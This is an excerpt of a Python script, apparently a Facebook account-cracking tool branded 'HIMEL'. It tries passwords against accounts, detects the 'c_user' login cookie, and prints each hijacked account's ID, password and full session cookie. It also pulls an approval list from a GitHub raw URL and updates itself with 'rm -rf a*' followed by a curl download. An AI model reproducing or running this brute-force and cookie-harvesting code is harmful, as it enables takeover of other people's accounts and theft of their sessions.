...
logo = """
         \033[1;37m _________ _______  _______  _       
         |\     /|\__   __/(       )(  ____ \( \      
         | )   ( |   ) (   | () () || (    \/| (      
         | (___) |   | |   | || || || (__    | |      
         |  ___  |   | |   | |(_)| ||  __)   | |      
         | (   ) |   | |   | |   | || (      | |      
         | )   ( |___) (___| )   ( || (____/\| (____/\
         |/     \|\_______/|/     \|(_______/(_______/ \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mKING HIMEL\033[1;37m
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/KINGHIMEL32/APROVEAL/main/Approved.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/KINGHIMEL32/APROVEAL/main/Approved.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/KINGHIMEL32/APROVEAL/main/Approved.txt > ali.py')
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/mdnx.himel32')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HIMEL-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[HIMEL-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHIMEL\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/KINGHIMEL32/APROVEAL/main/Approved.txt').text
    if id in httpCaht:
